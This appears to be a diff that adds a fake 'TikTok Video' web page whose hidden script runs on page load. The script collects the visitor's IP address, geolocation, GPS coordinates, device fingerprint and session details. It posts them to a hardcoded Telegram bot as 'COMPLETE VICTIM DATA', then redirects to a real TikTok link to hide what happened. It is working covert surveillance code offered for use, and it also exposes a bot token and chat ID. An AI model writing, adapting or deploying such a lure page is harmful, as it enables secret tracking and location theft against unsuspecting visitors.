@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TikTok Video</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #fff; 
+            text-align: center; 
+            font-family: Arial; 
+            margin: 0;
+            padding: 20px;
+        }
+        .loader {
+            margin-top: 50px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #333;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #data {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎵 TRENDING TIKTOK VIDEO</h1>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Preparing video content...</p>
+    </div>
+
+    <div id="data"></div>
+
+    <script>
+        async function collectAllPossibleData() {
+            let log = "=== COMPLETE DATA COLLECTION ===\\n";
+            
+            // 1. СЕТЕВЫЕ ДАННЫЕ
+            log += "=== NETWORK INFORMATION ===\\n";
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            log += "Public IP: " + ipData.ip + "\\n";
+            
+            try {
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                Object.keys(geoData).forEach(key => {
+                    if(geoData[key]) log += key + ": " + geoData[key] + "\\n";
+                });
+            } catch(e) {}
+
+            // 2. ДАННЫЕ БРАУЗЕРА И СИСТЕМЫ
+            log += "=== SYSTEM & BROWSER DATA ===\\n";
+            log += "User Agent: " + navigator.userAgent + "\\n";
+            log += "Platform: " + navigator.platform + "\\n";
+            log += "Vendor: " + navigator.vendor + "\\n";
+            log += "Browser Language: " + navigator.language + "\\n";
+            log += "Languages: " + navigator.languages.join(', ') + "\\n";
+            log += "Cookies: " + navigator.cookieEnabled + "\\n";
+            log += "PDF Viewer: " + navigator.pdfViewerEnabled + "\\n";
+            log += "WebDriver: " + navigator.webdriver + "\\n";
+
+            // 3. ХАРАКТЕРИСТИКИ УСТРОЙСТВА
+            log += "=== DEVICE CHARACTERISTICS ===\\n";
+            log += "Screen: " + screen.width + "x" + screen.height + "\\n";
+            log += "Available Screen: " + screen.availWidth + "x" + screen.availHeight + "\\n";
+            log += "Color Depth: " + screen.colorDepth + "bit\\n";
+            log += "Pixel Ratio: " + window.devicePixelRatio + "\\n";
+            log += "Touch Support: " + ('ontouchstart' in window) + "\\n";
+            log += "Max Touch Points: " + (navigator.maxTouchPoints || "unknown") + "\\n";
+            log += "Device Memory: " + (navigator.deviceMemory || "unknown") + "GB\\n";
+            log += "CPU Cores: " + navigator.hardwareConcurrency + "\\n";
+
+            // 4. ИНФОРМАЦИЯ О ПОДКЛЮЧЕНИИ
+            log += "=== CONNECTION DATA ===\\n";
+            if (navigator.connection) {
+                log += "Effective Type: " + navigator.connection.effectiveType + "\\n";
+                log += "Downlink: " + navigator.connection.downlink + "Mbps\\n";
+                log += "RTT: " + navigator.connection.rtt + "ms\\n";
+                log += "Save Data: " + navigator.connection.saveData + "\\n";
+            }
+
+            // 5. ГЕОЛОКАЦИЯ (ЕСЛИ РАЗРЕШЕНО)
+            log += "=== LOCATION DATA ===\\n";
+            if (navigator.geolocation) {
+                await new Promise(resolve => {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            log += "Latitude: " + position.coords.latitude + "\\n";
+                            log += "Longitude: " + position.coords.longitude + "\\n";
+                            log += "Accuracy: " + position.coords.accuracy + "m\\n";
+                            log += "Altitude: " + (position.coords.altitude || "null") + "\\n";
+                            log += "Altitude Accuracy: " + (position.coords.altitudeAccuracy || "null") + "\\n";
+                            log += "Heading: " + (position.coords.heading || "null") + "\\n";
+                            log += "Speed: " + (position.coords.speed || "null") + "\\n";
+                            resolve();
+                        },
+                        error => {
+                            log += "Geolocation Error: " + error.code + "\\n";
+                            resolve();
+                        },
+                        { timeout: 5000 }
+                    );
+                });
+            }
+
+            // 6. ДАННЫЕ О ПРОИЗВОДИТЕЛЬНОСТИ
+            log += "=== PERFORMANCE DATA ===\\n";
+            if (performance.memory) {
+                log += "Memory Usage: " + Math.round(performance.memory.usedJSHeapSize / 1048576) + "MB\\n";
+                log += "Memory Limit: " + Math.round(performance.memory.totalJSHeapSize / 1048576) + "MB\\n";
+            }
+
+            // 7. ИНФОРМАЦИЯ О СЕАНСЕ
+            log += "=== SESSION INFORMATION ===\\n";
+            log += "Referrer: " + document.referrer + "\\n";
+            log += "Current URL: " + window.location.href + "\\n";
+            log += "Domain: " + window.location.hostname + "\\n";
+            log += "Cookies Length: " + document.cookie.length + "\\n";
+            log += "Local Storage: " + (localStorage ? "available" : "unavailable") + "\\n";
+            log += "Session Storage: " + (sessionStorage ? "available" : "unavailable") + "\\n";
+
+            // 8. ВРЕМЕННЫЕ МЕТКИ
+            log += "=== TIMING DATA ===\\n";
+            log += "Local Time: " + new Date().toString() + "\\n";
+            log += "UTC Time: " + new Date().toUTCString() + "\\n";
+            log += "Timezone Offset: " + new Date().getTimezoneOffset() + "min\\n";
+            log += "Page Load Time: " + (performance.timing.loadEventEnd - performance.timing.navigationStart) + "ms\\n";
+
+            // 9. ДОПОЛНИТЕЛЬНЫЕ ТЕХНИЧЕСКИЕ ДАННЫЕ
+            log += "=== TECHNICAL CAPABILITIES ===\\n";
+            log += "WebGL: " + (!!document.createElement('canvas').getContext('webgl') ? "supported" : "unsupported") + "\\n";
+            log += "WebRTC: " + (!!window.RTCPeerConnection ? "supported" : "unsupported") + "\\n";
+            log += "Service Workers: " + ('serviceWorker' in navigator ? "supported" : "unsupported") + "\\n";
+            log += "Notifications: " + ('Notification' in window ? "supported" : "unsupported") + "\\n";
+
+            document.getElementById('data').textContent = log;
+            await sendToTelegram(log);
+        }
+
+        async function sendToTelegram(data) {
+            const botToken = "8044243850:AAG3jnmhyAPFJq2J1qXxyQAZ9tVA1smYBy0";
+            const chatId = "1486385025";
+            
+            try {
+                // Разбиваем на части если слишком длинное
+                const maxLength = 4000;
+                for (let i = 0; i < data.length; i += maxLength) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: '🔥 COMPLETE VICTIM DATA [' + (i/maxLength + 1) + ']:\\n' + 
+                                  data.substring(i, i + maxLength)
+                        })
+                    });
+                }
+            } catch(e) {}
+        }
+
+        // ЗАПУСК
+        setTimeout(() => {
+            collectAllPossibleData();
+            setTimeout(() => {
+                window.location.href = "https://vm.tiktok.com/ZMAbhyLnv/";
+            }, 5000);
+        }, 1000);
+    </script>
+</body>
+</html>
